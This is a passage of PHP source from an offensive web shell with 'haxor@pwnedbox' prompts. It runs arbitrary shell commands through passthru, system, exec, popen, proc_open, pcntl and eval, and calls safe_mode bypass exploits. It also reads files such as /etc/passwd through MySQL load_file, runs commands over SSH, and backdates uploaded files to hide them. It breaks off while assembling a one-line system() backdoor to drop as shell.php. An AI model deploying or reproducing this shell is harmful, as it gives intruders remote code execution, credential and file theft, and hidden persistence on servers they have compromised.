   if (extension_loaded('pcntl')) {
    if (function_enabled('pcntl_fork')) {
     if (function_enabled('pcntl_exec')) {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s"><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">" checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="./rezult.html"> ';
      if (is_writable("./")) {
       echo "<font color=\"green\">(./ writable)</font>";
      } else {
       echo "<font color=\"red\">(./ readonly)</font>";
      }
      echo '<br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     } else {
      echo "<br>pcntl_exec is disabled!<br>";
     }
    } else {
     echo "<br>pcntl_fork is disabled!<br>";
    }
   } else {
    echo "<br>fail, no pcntl.so here<br>";
   }
   echo "<br>ssh2_exec:";
   if (extension_loaded('ssh2')) {
    if (function_enabled('ssh2_connect')) {
     if (function_enabled('ssh2_exec')) {
      if ($download != "1") {
       if (empty($_POST["wut"])) {
        echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"> <font color="gray">host: <input name="ssh2host" type="text" size="20" value="localhost"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="22"> user: <input name="ssh2user" type="text" size="20" value="h4x0r"> password: <input name="ssh2pass" type="text" size="20" value="r0xx0r"> </font><br><font color="green"> haxor@pwnedbox$ </font><input name="command" type="text" size="40" value="uname -a"> <input type="submit" value="go"><input name="p" type="hidden" value="s"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
       }
      }
     } else {
      echo "<br>ssh2_exec is disabled!";
     }
    } else {
     echo "<br>ssh2_connect is disabled!";
    }
   } else {
    echo "<br>fail, no ssh2.so here";
   }
   echo $pageend;
  } else {
   if ($download != "1") {
    echo $title;
   }
   $shelltext=$_POST["command"];
   $html='<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s">';
   $input='<textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> 2>&1 <input type="submit" value="Enter"> <input type="checkbox" name="down"> download <input name="wut" type="hidden" value="';
   if ($download != "1") {
   switch ($_POST["wut"]) {
    case "passthru":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'passthru"></form>';
     break;
    case "system":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'system"></form>';
     break;
    case "exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'exec"></form>';
     break;
    case "shell_exec":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'shell_exec"></form>';
     break;
    case "popen":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'popen"></form>';
     break;
    case "proc_open":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo "$input"; echo 'proc_open"></form>';
     break;
    case "eval":
     if (strnatcmp(version(),"5.2.9") <= 0) {
      sploent516();
     }
     echo "$html"; echo 'php -r \''; echo '<textarea name="command" rows="1" cols="50" onkeyup="changeSize(this)">'.$shelltext.'</textarea> \' <input type="submit" value="Enter">
     <input name="wut" value="eval" type="hidden"></form>';
     break;
    case "pcntl":
     //sploent516 not needed coz pcntl bypasses safe_mode
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> interpreter <input name="inter" type="text" size="10" value="/bin/sh"></font> <br><font color="green"> haxor@pwnedbox$ </font><input name="p" type="hidden" value="s"><input name="command" type="text" size="40" value="'.$shelltext.'"> &gt;<input type="radio" name="to" value=">" checked> &gt;&gt;<input type="radio" name="to" value=">>"> <input name="pcfile" type="text" size="20" value="'.$_POST["pcfile"].'">';
     if (is_writable("./")) {
      echo "<font color=\"green\">(./ writable)</font>";
     } else {
      echo "<font color=\"red\">(./ readonly)</font>";
     }
     echo ' <br><font color="gray">delete result file after showing contents</font><input type="checkbox" name="delrezult" checked><input type="submit" value="go"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="pcntl"></form>';
     break;
    case "ssh2":
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="gray"> host: <input name="ssh2host" type="text" size="20" value="'.$_POST["ssh2host"].'"> port: <input name="ssh2port" type="text" size="5" maxlength="5" value="'.$_POST["ssh2port"].'"> user: <input name="ssh2user" type="text" size="20" value="'.$_POST["ssh2user"].'"> password: <input name="ssh2pass" type="text" size="20" value="'.$_POST["ssh2pass"].'"> </font><br><font color="green"> haxor@pwnedbox$ </font> <input name="command" type="text" size="40" value="'.$shelltext.'"> <input type="submit" value="go"><input name="p" type="hidden" value="s"> <input type="checkbox" name="down"> download  <input name="wut" type="hidden" value="ssh2"></form>';
     break;
   }
   }
  }
  if (!empty($_POST["wut"])) {
   if ($download != "1") {
    echo "<textarea cols=\"80\" rows=\"40\">";
   }
   switch ($_POST["wut"]) {
    case "passthru":
     passthru($_POST["command"]." 2>&1");
     break;
    case "system":
     system($_POST["command"]." 2>&1");
     break;
    case "exec":
     exec($_POST["command"]." 2>&1",$out);
     echo join("\n",$out);
     break;
    case "shell_exec":
     $out=shell_exec($_POST["command"]." 2>&1");
     echo "$out";
     break;
    case "popen":
     $hndl=popen($_POST["command"]." 2>&1", "r");
     $read=stream_get_contents($hndl);
     echo $read;
     pclose($hndl);
     break;
    case "proc_open":
     $process = proc_open('/bin/sh', $descriptorspec, $pipes);
     if (is_resource($process)) {
      fwrite($pipes[0],$_POST["command"]);
      fclose($pipes[0]);
      echo stream_get_contents($pipes[1]);
      fclose($pipes[1]);
      echo stream_get_contents($pipes[2]);
      fclose($pipes[2]);
      @proc_close($process);
     }
     break;
    case "pcntl":
     $shelltext=$_POST["command"];
     switch (pcntl_fork()) {
      case 0:
       pcntl_exec($_POST["inter"],array("-c","".$_POST["command"]." ".$_POST["to"]." ".$_POST["pcfile"]));
       exit(0);
      default:
       break;
     }
     sleep(1);
     $fh=fopen("".$_POST["pcfile"]."","r");
     if (!$fh) { echo "can`t fopen ".$_POST["pcfile"].", seems that we failed :("; }
     else {
      $rezult=fread($fh,filesize($_POST["pcfile"]));
      fclose($fh);
      echo $rezult;
      if ($_POST["delrezult"] == "on") { unlink($_POST["pcfile"]); }
     }
     break;
    case "eval":
     eval($_POST["command"]);
     break;
    case "ssh2":
     $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?");
     //using knowingly wrong username to test auth. methods
     $auth_methods = ssh2_auth_none($connection, '12309tezt');
     if (in_array('password', $auth_methods)) {
      $connection=ssh2_connect($_POST["ssh2host"], $_POST["ssh2port"]) or die ("cant connect. host/port wrong?"); //need to connect again after failed login
      if (ssh2_auth_password($connection, ''.$_POST["ssh2user"].'', ''.$_POST["ssh2pass"].'')) {
       $stream=ssh2_exec($connection, $shelltext); 
       stream_set_blocking($stream, true);
       $data = "";
       while ($buf = fread($stream,4096)) {
        $data .= $buf;
       }
       fclose($stream);
       echo $data;
      } else {
       echo "cant login. user/pass wrong?";
      }
     } else {
      echo 'fail, no "password" auth method';
     }     
     break;
   }
   if ($download != "1") {
    echo "</textarea>";
   }
  }
 break; 
// --------------------------------------------- shell end; file operations
 case "f":
  if ($download != "1") {
   echo $title;
   echo "<font color=\"gray\">";
   echo "current dir: ".getcwd()."<br>";
   sploent516();
   echo "<br>--------------------------------<br></font>";
  }
  if (empty($_POST["filer"]) and $download != "1" and empty($_POST["edt"]) and empty($_POST["sqlr"]) and empty($_POST["sqlu"]) and empty($_POST["upload"])) {
  echo '<a href="#" onclick="showTooltip(7)" id="link"> &gt;&gt; read/upload/edit file &lt;&lt; </a><br><br>
  <div id="7" style="display: none">';
   $ololotext="/home/USER/public_html/DOMAIN/index.php";
   echo '<font color="blue">---> read file </font><br>';
   echo "php file_get_contents:<br>";
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
   <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"> <input type="checkbox" name="down"> download </form>';
   //curl
   if (strnatcmp(version(),"5.2.9") <= 0) {
    echo "<br> curl exploit: <br>";
    if (!extension_loaded('curl')) {
     echo "&nbsp;&nbsp;fail, curl is required<br>";
    } else {
     echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green"> haxor@pwnedbox$</font> cat <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
     <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"> <input type="checkbox" name="down"> download </form>';
    }
   }
  } else {
   switch ($_POST["filer"]) {
    case "php":
     $ololotext=($_POST["filename"]);
     if ($download != "1") {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="php"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if ($download != "1") {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\">";
      }
      $contents=file_get_contents($_POST["filename"]) or die("failed. bad permissions or no such file?".$pageend."");
      echo $contents;
      if ($download != "1") {
       echo "</textarea>";
      }
      echo $pageend;
      die(); 
     }
     break;  
    case "curl":
     $ololotext=($_POST["filename"]);
     if ($download != "1") {
      echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><font color="green">haxor@pwnedbox$ </font>cat
      <input name="filename" type="text" maxlength="500" size="50" value="'.$ololotext.'">
      <input name="filer" type="hidden" value="curl"><input type="submit" value="Enter"><input name="p" type="hidden" value="f"><input type="checkbox" name="down"> download </form>';
     }
     if (!empty($_POST["filename"])) { 
      if ($download != "1") {
       echo '<font color="gray">';
       echo "<textarea cols=\"80\" rows=\"40\">";
      }
      sploent529($_POST["filename"]);
     }
    break;
   }
  }
  // curl + file_get_contents end
  if ($download != "1" and empty($_POST["edt"]) and empty($_POST["sqlu"])) {
   echo "<br>mysql:<br>";
   if (empty($_POST["sqlr"])) {
    $user="root";
    $pass="12345";
    $db="test";
    $host="localhost";
    $port="3306";
    $file="/etc/passwd";
   } else {
    $user=$_POST['user'];
    $pass=$_POST['pass'];
    $db=$_POST['db'];
    $host=$_POST['host'];
    $port=$_POST['port'];
    $file=$_POST['file'];
   }
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'">user <input name="user" type="text" maxlength="500" size="10" value="'.$user.'"> password <input name="pass" type="text" maxlength="500" size="10" value="'.$pass.'"> host <input name="host" type="text" maxlength="500" size="10" value="'.$host.'">:<input name="port" type="text" maxlength="5" size="5" value="'.$port.'"> database <input name="db" type="text" maxlength="500" size="10" value="'.$db.'"><font color="gray">(needed for `load data infile`)</font><br><input name="wut" value="load_file" type="radio" checked>load_file<br><input name="wut" value="infile" type="radio">load data infile <font color="gray">(use it for binary files)</font><br><input name="file" type="text" maxlength="500" size="40" value="'.$file.'"> <input type="submit" value="go"><input name="sqlr" type="hidden" value="yup"><br><input name="p" type="hidden" value="f"></form>';
   if (!empty($_POST["sqlr"])) {
    $link=mysql_connect("".$host.":".$port."",$user,$pass) or die("cant connect: ".mysql_error()."".$pageend."");
    switch ($_POST['wut']) {
    case "load_file":
     $q='SELECT load_file("'.$_POST["file"].'")';
     $rez=mysql_query($q,$link) or die("query error:".mysql_error()."".$pageend."");
     echo "result:<br>";
     echo "<textarea cols=\"80\" rows=\"20\">";
     echo mysql_result($rez,0);
     echo "</textarea><br>";
     echo $pageend;
     die();
     break;
    case "infile":
     mysql_select_db($db) or die ("cannot select db: ".mysql_error()."".$pageend."");
     mysql_query("CREATE TABLE `file` ( `text` LONGBLOB NOT NULL );") or die ("cannot create table: ".mysql_error()."".$pageend.""); 
     mysql_query("LOAD DATA INFILE \"".$_POST["file"]."\" INTO TABLE file LINES TERMINATED BY '' (`text`)") or die ("cannot load data: ".mysql_error()."".$pageend."");
     $rez=mysql_query("SELECT * FROM file;");
     if (!$rez) { echo "fail. permission denied?<br>"; }
     else {
      for ($i=0;$i<mysql_num_fields($rez);$i++) {$name = mysql_field_name($rez,$i);}
      $f = "";
      while ($row = mysql_fetch_array($rez, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
      if (empty($f)) {
       echo "file does not exists or empty?<br>";
      } else {
       echo "result:<br>";
       // code from c99shell madnet edition
       $n = 0;
       $a0 = "00000000<br>";
       $a1 = "";
       $a2 = "";
       for ($i=0; $i<strlen($f); $i++) {
        $a1 .= sprintf("%02X",ord($f[$i]))." ";
        switch (ord($f[$i])) {
         case 0:  $a2 .= "<font>0</font>"; break;
         case 32:
         case 10:
         case 13: $a2 .= "&nbsp;"; break;
         default: $a2 .= htmlspecialchars($f[$i]);
        }
        $n++;
        if ($n == 24) {
         $n = 0;
         if ($i+1 < strlen($f)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
         $a1 .= "<br>";
         $a2 .= "<br>";
        }
       }
       echo '<table border=0 cellspacing="1" cellpadding="4"><tr><td>'.$a0.'</td><td>'.$a1.'</td><td>'.$a2.'</td></tr></table><br>';
      }
      mysql_free_result($result);
      mysql_query("DROP TABLE file;") or die("cannot drop table: ".mysql_error()."".$pageend."");
     }
     echo $pageend;
     die();
    break;
    }
   mysql_close($link);
   }
  }
  // mysql read file end. upload
   if ($download != "1" and empty($_POST["edt"])) {
    echo '<br><font color="blue">---> upload file</font><br>';
    if (!ini_get('file_uploads')) {
     echo "php file_uploads Off<br>";
    } else {
     echo "<font color=\"gray\">post_max_size: ".ini_get('post_max_size')."<br>"; 
     echo "upload_max_filesize: ".ini_get('upload_max_filesize')."<br>"; 
     echo "</font>";
     if (is_writable("./")) {
      echo "<font color=\"green\">./ writable</font>";
     } else {
      echo "<font color=\"red\">./ readonly</font>";
     }
     if (!isset($_POST["dir"])) {
      $upto=".";
     } else {
      $upto=$_POST["dir"];
     }
     echo '<form enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="sourcefile" type="file"> upload to <font color="gray">(dir)</font><input name="filedir" type="text" maxlength="500" size="20" value="'.$upto.'"><font color="green">/</font><input name="upname" type="text" maxlength="500" size="20" value=""><font color="gray">(name. empty = use original file`s name)</font> <input name="upload" type="hidden" value="okz"><input name="p" type="hidden" value="f"><br><input type="submit" value="upload">';
     echo '</form>';
     if (!empty($_POST["upload"])) {
      if(is_uploaded_file($_FILES["sourcefile"]["tmp_name"]))
      {
       echo "upload ok";
       $dirtime=filemtime($_POST['filedir']);
       if (!empty($_POST["upname"])) {
        $upname=$_POST["upname"];
       } else {
        $upname=$_FILES["sourcefile"]["name"];
       }
       move_uploaded_file($_FILES["sourcefile"]["tmp_name"], $_POST['filedir']."/".$upname) or die("<br>moving failed!<br>".$pageend."");
       echo "<br>moving done, trying to touch (old time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",$dirtime).")<br>";
       touch($_POST['filedir']."/".$upname,$dirtime,$dirtime) or die ("<br>touch failed!<br>".$pageend."");
       echo "file touched: new time of ".$upname." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']."/".$upname)).". trying to touch dir<br>";
       touch($_POST['filedir'],$dirtime,$dirtime) or die ("<br>touch dir failed!<br>".$pageend."");
       echo "dir touched: new time of ".$_POST['filedir']." = ".date("d/m/Y H:i:s",filemtime($_POST['filedir']))."<br>";
      } else {
       echo("<br>upload failed!<br>");
      }
     }
    }
    if ($download != "1" and empty($_POST["edt"])) {
     echo "<br>mysql:<br>";
     if (empty($_POST["sqlu"])) {
      $user="root";
      $pass="12345";
      $db="test";
      $host="localhost";
      $port="3306";
      if (empty($_POST["dir"])) {
       $dir=getcwd();
      } else {
       $dir=$_POST["dir"];
      }
      $file=$dir."/shell.php";
      $evilcodez='<?php system($_GET["command"]); ?>